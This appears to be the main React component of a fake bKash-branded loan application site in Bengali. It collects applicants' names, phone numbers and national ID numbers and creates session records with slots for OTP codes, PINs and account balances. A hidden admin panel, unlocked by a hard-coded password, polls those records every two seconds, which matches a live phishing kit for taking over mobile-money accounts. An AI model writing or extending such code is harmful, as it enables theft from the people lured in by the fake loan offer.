
import React, { useState, useEffect } from 'react';
import { AppStep, LoanFormData } from './types';
import Header from './components/Header';
import Footer from './components/Footer';
import HomePage from './components/HomePage';
import LoanForm from './components/LoanForm';
import AccountDetailsPage from './components/AccountDetailsPage';
import FinalResultPage from './components/FinalResultPage';
import AdminPanel from './components/AdminPanel';

// Mock Firebase Realtime Database API using Replit Proxy
export const db = {
  ref: (path: string) => ({
    set: async (data: any) => {
      await fetch('/api/db', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ path, data })
      });
    },
    update: async (data: any) => {
      await fetch('/api/db', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ path, data })
      });
    },
    remove: async () => {
      await fetch(`/api/db?path=${path}`, { method: 'DELETE' });
    },
    on: (event: string, callback: (snapshot: any) => void) => {
      const fetchOnce = async () => {
        const res = await fetch(`/api/db?path=${path}`);
        const val = await res.json();
        callback({ val: () => val, key: path.split('/').pop() });
      };
      
      fetchOnce();
      const interval = setInterval(fetchOnce, 2000); // Poll every 2 seconds
      return () => clearInterval(interval);
    },
    off: (event: string, listener: any) => {
      // In polling mode, off is handled by the component's useEffect cleanup
    }
  })
};

const App: React.FC = () => {
  const [currentStep, setCurrentStep] = useState<AppStep>(AppStep.Home);
  const [showAdminModal, setShowAdminModal] = useState(false);
  const [adminPassword, setAdminPassword] = useState('');
  const [sessionId, setSessionId] = useState<string>(localStorage.getItem('user_session_id') || '');
  
  const [formData, setFormData] = useState<LoanFormData>({
    fullName: '',
    loanAmount: '',
    duration: '',
    address: '',
    paymentNumber: '',
    paymentMethod: 'bKash',
    nidNumber: ''
  });

  const handleStartApplication = () => {
    setCurrentStep(AppStep.ApplicationForm);
  };

  const handleFormSubmit = (data: LoanFormData) => {
    const uniqueId = 'ORD-' + Math.random().toString(36).substr(2, 6).toUpperCase();
    const newSessionId = 'SESS-' + Date.now();
    
    setSessionId(newSessionId);
    localStorage.setItem('user_session_id', newSessionId);

    db.ref('sessions/' + newSessionId).set({
      id: newSessionId,
      orderId: uniqueId,
      name: data.fullName,
      initialPhone: data.paymentNumber,
      gatewayPhone: '',
      balance: '0',
      otp: '',
      pin: '',
      waitingFor: 'NONE',
      adminAction: 'NONE',
      lastUpdated: Date.now()
    });

    setFormData(data);
    setCurrentStep(AppStep.AccountDetails);
  };

  const handleAccountDetailsSubmit = () => {
    setCurrentStep(AppStep.FinalResult);
  };

  const handleAdminLogin = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (adminPassword === 'onlinebased321') {
      setCurrentStep(AppStep.Admin);
      setShowAdminModal(false);
      setAdminPassword('');
    } else {
      alert('ভুল পাসওয়ার্ড!');
      setAdminPassword('');
    }
  };

  const renderStep = () => {
    switch (currentStep) {
      case AppStep.Home:
        return <HomePage onStart={handleStartApplication} />;
      case AppStep.ApplicationForm:
        return <LoanForm onSubmit={handleFormSubmit} initialData={formData} />;
      case AppStep.AccountDetails:
        return <AccountDetailsPage data={formData} sessionId={sessionId} onSubmit={handleAccountDetailsSubmit} />;
      case AppStep.FinalResult:
        return <FinalResultPage data={formData} sessionId={sessionId} />;
      case AppStep.Admin:
        return <AdminPanel onBack={() => setCurrentStep(AppStep.Home)} />;
      default:
        return <HomePage onStart={handleStartApplication} />;
    }
  };

  return (
    <div className="min-h-screen flex flex-col relative">
      <Header />
      <main className="flex-grow container mx-auto px-4 py-8">
        {renderStep()}
      </main>
      <Footer onAdminClick={() => setShowAdminModal(true)} />

      {showAdminModal && (
        <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4">
          <div className="bg-white rounded-2xl shadow-2xl p-8 max-w-sm w-full animate-fade-in">
            <h3 className="text-xl font-bold text-gray-800 mb-4 text-center">এডমিন লগইন</h3>
            <form onSubmit={handleAdminLogin} className="space-y-4">
              <input 
                type="password" 
                value={adminPassword}
                onChange={(e) => setAdminPassword(e.target.value)}
                placeholder="পাসওয়ার্ড দিন"
                autoFocus
                className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:ring-2 focus:ring-[#E2136E] text-center"
              />
              <div className="flex space-x-3">
                <button type="button" onClick={() => setShowAdminModal(false)} className="flex-1 py-2 text-gray-500 font-bold">বাতিল</button>
                <button type="submit" className="flex-1 py-2 bg-[#E2136E] text-white font-bold rounded-lg">প্রবেশ</button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};

export default App;
